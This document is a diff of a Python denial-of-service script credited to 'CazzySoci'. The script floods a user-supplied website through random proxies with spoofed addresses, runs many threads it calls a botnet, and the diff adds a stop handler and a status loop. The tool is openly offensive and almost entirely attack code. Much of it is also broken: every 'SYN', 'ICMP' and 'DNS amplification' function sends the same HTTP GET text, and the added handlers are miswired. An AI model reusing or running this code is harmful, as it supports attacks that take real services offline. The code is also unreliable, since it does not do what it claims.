@@ -4,19 +4,20 @@ import random
 import dns.resolver
 import requests
 import time
+import sys
 
 credit = """
 \033[1;36m
- ▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
+▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
 ▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
 ▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
 ░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
- ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
- ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓  
+▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
+▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓ 
   ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
   ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
-      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░  
-                                         ░                  ░        ░         ░ ░                       ░            
+      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░ 
+                                         ░                  ░        ░         ░ ░                       ░           
 ╔════════════════════════╗
 ║ Created by: CazzySoci  ║
 ║                        ║
@@ -65,7 +66,7 @@ def udp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect((proxy_ip, int(proxy_port)))
-        
+
         fake_ip = generate_fake_ip()
         message = "GET /" + target_ip + " HTTP/1.1\r\n"
         message += "Host: " + target_ip + "\r\n"
@@ -74,14 +75,14 @@ def udp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
         message += "Accept-Encoding: gzip, deflate\r\n"
         message += "Connection: keep-alive\r\n"
         message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-        
-        packet_count = random.randint(10000, 20000)  
-        
+
+        packet_count = random.randint(10000, 20000) 
+
         for _ in range(packet_count):
             s.sendto(message.encode('ascii'), (fake_ip, target_port))
-        
+
         print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | UDP flood sent (Increased speed and packet count)")
-        
+
         s.close()
     except:
         pass
@@ -90,7 +91,7 @@ def syn_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((proxy_ip, int(proxy_port)))
-        
+
         fake_ip = generate_fake_ip()
         message = "GET /" + target_ip + " HTTP/1.1\r\n"
         message += "Host: " + target_ip + "\r\n"
@@ -99,14 +100,14 @@ def syn_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
         message += "Accept-Encoding: gzip, deflate\r\n"
         message += "Connection: keep-alive\r\n"
         message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-        
-        packet_count = random.randint(10000, 20000)  
-        
+
+        packet_count = random.randint(10000, 20000) 
+
         for _ in range(packet_count):
             s.send(message.encode('ascii'))
-        
+
         print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | SYN flood sent (Increased speed and packet count)")
-        
+
         s.close()
     except:
         pass
@@ -115,7 +116,7 @@ def http_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((proxy_ip, int(proxy_port)))
-        
+
         fake_ip = generate_fake_ip()
         message = "GET /" + target_ip + " HTTP/1.1\r\n"
         message += "Host: " + target_ip + "\r\n"
@@ -124,14 +125,14 @@ def http_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
         message += "Accept-Encoding: gzip, deflate\r\n"
         message += "Connection: keep-alive\r\n"
         message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-        
-        packet_count = random.randint(10000, 20000)  
-        
+
+        packet_count = random.randint(10000, 20000) 
+
         for _ in range(packet_count):
             s.send(message.encode('ascii'))
-        
+
         print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | HTTP flood sent (Increased speed and packet count)")
-        
+
         s.close()
     except:
         pass
@@ -140,7 +141,7 @@ def tcp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((proxy_ip, int(proxy_port)))
-        
+
         fake_ip = generate_fake_ip()
         message = "GET /" + target_ip + " HTTP/1.1\r\n"
         message += "Host: " + target_ip + "\r\n"
@@ -149,14 +150,14 @@ def tcp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
         message += "Accept-Encoding: gzip, deflate\r\n"
         message += "Connection: keep-alive\r\n"
         message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-        
-        packet_count = random.randint(10000, 20000)  
-        
+
+        packet_count = random.randint(10000, 20000) 
+
         for _ in range(packet_count):
             s.send(message.encode('ascii'))
-        
+
         print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | TCP flood sent (Increased speed and packet count)")
-        
+
         s.close()
     except:
         pass
@@ -165,7 +166,7 @@ def ssl_tls_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((proxy_ip, int(proxy_port)))
-        
+
         fake_ip = generate_fake_ip()
         message = "GET /" + target_ip + " HTTP/1.1\r\n"
         message += "Host: " + target_ip + "\r\n"
@@ -174,14 +175,14 @@ def ssl_tls_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
         message += "Accept-Encoding: gzip, deflate\r\n"
         message += "Connection: keep-alive\r\n"
         message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-        
-        packet_count = random.randint(10000, 20000)  
-        
+
+        packet_count = random.randint(10000, 20000) 
+
         for _ in range(packet_count):
             s.send(message.encode('ascii'))
-        
+
         print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | SSL/TLS flood sent (Increased speed and packet count)")
-        
+
         s.close()
     except:
         pass
@@ -190,7 +191,7 @@ def icmp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
         s.connect((proxy_ip, int(proxy_port)))
-        
+
         fake_ip = generate_fake_ip()
         message = "GET /" + target_ip + " HTTP/1.1\r\n"
         message += "Host: " + target_ip + "\r\n"
@@ -199,14 +200,14 @@ def icmp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port):
         message += "Accept-Encoding: gzip, deflate\r\n"
         message += "Connection: keep-alive\r\n"
         message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-        
-        packet_count = random.randint(10000, 20000)  
-        
+
+        packet_count = random.randint(10000, 20000) 
+
         for _ in range(packet_count):
             s.send(message.encode('ascii'))
-        
+
         print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | ICMP flood sent (Increased speed and packet count)")
-        
+
         s.close()
     except:
         pass
@@ -215,7 +216,7 @@ def dns_amplification(target_ip, spoofed_ip, proxy_ip, proxy_port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect((proxy_ip, int(proxy_port)))
-        
+
         fake_ip = generate_fake_ip()
         message = "GET /" + target_ip + " HTTP/1.1\r\n"
         message += "Host: " + target_ip + "\r\n"
@@ -224,14 +225,14 @@ def dns_amplification(target_ip, spoofed_ip, proxy_ip, proxy_port):
         message += "Accept-Encoding: gzip, deflate\r\n"
         message += "Connection: keep-alive\r\n"
         message += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n\r\n"
-        
-        packet_count = random.randint(10000, 20000)  
-        
+
+        packet_count = random.randint(10000, 20000) 
+
         for _ in range(packet_count):
             s.sendto(message.encode('ascii'), (fake_ip, target_port))
-        
+
         print(f"Target IP: {target_ip} | Spoofed IP: {fake_ip} | Proxy: {proxy_ip}:{proxy_port} | DNS amplification attack sent (Increased speed and packet count)")
-        
+
         s.close()
     except:
         pass
@@ -243,7 +244,7 @@ def ddos_attack():
             spoofed_ip = spoofer()
             proxy = random.choice(proxy_list)
             proxy_ip, proxy_port = proxy.split(":")
-            
+
             attack_type = random.randint(1, 7)
 
             if attack_type == 1:
@@ -260,8 +261,8 @@ def ddos_attack():
                 icmp_flood(target_ip, spoofed_ip, proxy_ip, proxy_port)
             else:
                 dns_amplification(target_ip, spoofed_ip, proxy_ip, proxy_port)
-            
-            time.sleep(random.uniform(0.1, 0.5))  
+
+            time.sleep(random.uniform(0.1, 0.5)) 
         except:
             pass
 
@@ -269,6 +270,10 @@ def create_botnet():
     for _ in range(botnet_size):
         thread = threading.Thread(target=ddos_attack)
         thread.start()
+
+def stop_attack():
+    print("Stopping the DDoS attack...")
+    sys.exit()
 
 def check_website(url):
     if not url.startswith("http://") and not url.startswith("https://"):
@@ -283,9 +288,27 @@ def check_website(url):
             print("Successfully launching the DDoS attack!")
             create_botnet()
             print("Botnet created!")
+            print("Press CTRL+C or CTRL+Z to stop the attack.")
+            signal.signal(signal.SIGINT, stop_attack)
+            signal.signal(signal.SIGTSTP, stop_attack)
         else:
             print("Sorry, the website URL is not valid.")
     except:
         print("Sorry, the website URL is not valid.")
 
 check_website(target_url)
+
+def check_botnet_status():
+    print("Checking botnet status...")
+    while True:
+        try:
+            print(f"Botnet size: {botnet_size}")
+            print(f"Target IP: {random.choice(get_ip_addresses(target_url))}")
+            print(f"Spoofed IP: {spoofer()}")
+            proxy = random.choice(proxy_list)
+            proxy_ip, proxy_port = proxy.split(":")
+            print(f"Proxy: {proxy_ip}:{proxy_port}")
+            print("Botnet is active and ready to launch attacks!")
+            time.sleep(5)  # Wait for 5 seconds before printing the status again
+        except:
+            pass
